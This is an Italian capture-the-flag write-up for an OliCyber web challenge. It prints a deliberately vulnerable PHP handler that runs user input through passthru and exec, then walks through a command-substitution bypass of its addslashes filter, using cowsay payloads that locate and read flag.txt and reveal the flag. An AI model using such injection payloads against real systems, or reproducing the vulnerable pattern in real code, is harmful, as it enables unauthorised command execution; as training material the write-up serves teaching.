---
titolo: "Write-up: Timp - Shell"
data: 2026-09-23
categoria: Web
tags:
  - shell
---
## 1. Informazioni Generali
* **Piattaforma:** [olicyber.training.it]
* **Difficoltà:** [Media] 
* **Risorsa:** [http://timp.challs.olicyber.it](http://timp.challs.olicyber.it)

## 1. Allegati
In allegato alla sfida c'era il seguente codice php, chiamato _handler.php_
```php
<?php 
    if(isset($_POST["cmd"]) && !empty($_POST["cmd"])){
        $cmd = $_POST["cmd"];
        $result;
        if(empty($cmd)){
            $result = "Almeno prova a darmi un comando, dai";
        }
        else{
            if(preg_match('/[#@%^&*_+\[\]:>?~\\\\]/', $cmd)){
                $result = "Stai cercando di hackerarmi usando strani caratteri? Con me non funziona";
            }
            elseif(strlen($cmd) > 70){
                $result = "Alle superiori ho scritto temi meno lunghi di così";
            }
            elseif (strpos($cmd, "cowsay") !== false) {
                $arr = explode('"', $cmd);
                if($arr && !empty($arr) && $arr[1]){
                    $str = $arr[1];
                    if($str && !empty($str)) $result = passthru('cowsay "'.addslashes($str).'"');
                    else $result = "Nope";
                }
                else $result = "Nope";
            }
            elseif(strpos($cmd, "sudo") !== false){
                $result = "Sudi? Fatti una doccia..";
            }
            elseif(strpos($cmd, "echo") !== false){
                $result = "echooo echoo echo ech ec e";
            }
            elseif (strpos($cmd, "cat") !== false) {
                $result = "Miao";
                $result .= "\n   \    /\\";
                $result .= "\n    )  ( ')";
                $result .= "\n   (  /  )";
                $result .= "\n    \(__)|"; 
            }
            elseif (strpos($cmd, " ") !== false){
                $result = "Qui non c'è spazio per gli spazi!";
            }
            elseif (strpos($cmd, "head") !== false || strpos($cmd, "tail") !== false || strpos($cmd, "od") !== false || strpos($cmd, "less") !== false || strpos($cmd, "head") !== false || strpos($cmd, "hexdump") !== false){
                $result = "Vorresti leggere qualcosa? Non penso proprio";
            }
            else{
                $result = exec($cmd);
                $result = substr($result, 0, 10);
            }
        }
        echo $result;
    }
?>
```

## 2. Analisi delle vulnerabilità
Il file in allegato sopra è il codice php della pagina che vediamo, ovvero il terminale con la mucca parlante. In particolare si nota come blocchi i caratteri speciali tramite una **regex**, oltre che vari comandi da **terminale** (quali _head_, _tail_, _cat_, etc...). L'unico comando che permette di eseguire è **_cowsay_**, che permette di far dire alla mucca parlante ciò che è seguito dopo quel comando tra le virgolette ( " ). 
Questa è la riga in cui accetta il comando _cowsay_
```php
if($str && !empty($str)) 
	$result = passthru('cowsay "'.addslashes($str).'"');
```
La funzione **_passthru_** esegue comandi del teminale restituendo l'output direttamente al browser, mentra **_addslashes_** mette \ davanti a caratter specifici: ( ' ), ( " ), ( \ ) e il Byte NUL. La vulnerabilità sta proprio in questa funzione: si può infatti sfruttare una **command substitution**, che consiste nel sostituire la stringa passata come parametro a cowsay con **$(...)**, dove dentro le parentesi si mette un qualsiasi comando terminale. In questo modo, quando viene eseguito il comando cowsay, prima viene notata la sostituzione (ovvero il dollaro con le parentesi) e viene eseguito il comando che si trova lì dentro. 
## 3. Exploitation
Si digita nel terminale della pagina web il seguente comando per cercare il file _flag.txt_ (come suggerito dalla challenge, la flag si trova lì dentro):
```
cowsay "$(find . -name flag.txt)"
```
Trovato il suo percorso (ovvero /flag.txt), si usa il seguente comando per leggerne il contenuto:
```
cowsay "$(cat flag.txt)"
```
In questo modo otteniamo la flag:
```
flag{1t's_4_l0ng_fl4g_but_s0me0n3_h4d_t0_re4d_1t!}
```
